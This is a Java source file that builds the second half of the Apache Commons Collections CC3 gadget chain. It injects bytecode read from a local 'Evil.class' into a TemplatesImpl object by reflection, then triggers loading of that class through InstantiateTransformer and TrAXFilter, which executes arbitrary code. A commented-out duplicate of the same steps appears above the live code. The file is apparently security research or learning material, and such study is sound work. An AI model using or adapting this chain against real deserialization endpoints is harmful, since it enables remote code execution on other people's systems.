package CC3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class CC32ndHalfExp {
    public static void main(String[] args) throws Exception {
//        TemplatesImpl templates = new TemplatesImpl();
//        Class templatesClass = templates.getClass();
//        Field nameField = templatesClass.getDeclaredField("_name");
//        nameField.setAccessible(true);
//        nameField.set(templates,"NotNULL");
//
//        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
//        bytecodesField.setAccessible(true);
//        byte[] exp = Files.readAllBytes(Paths.get("/home/n0zom1z0/Evil.class"));
//        byte[][] bytecodes = {exp};
//        bytecodesField.set(templates,bytecodes);
//
//        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templates,new TransformerFactoryImpl());
//
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"Drunkbaby");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("/home/n0zom1z0/Evil.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        //    templates.newTransformer();

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},
                new Object[]{templates});
        instantiateTransformer.transform(TrAXFilter.class);
    }
}
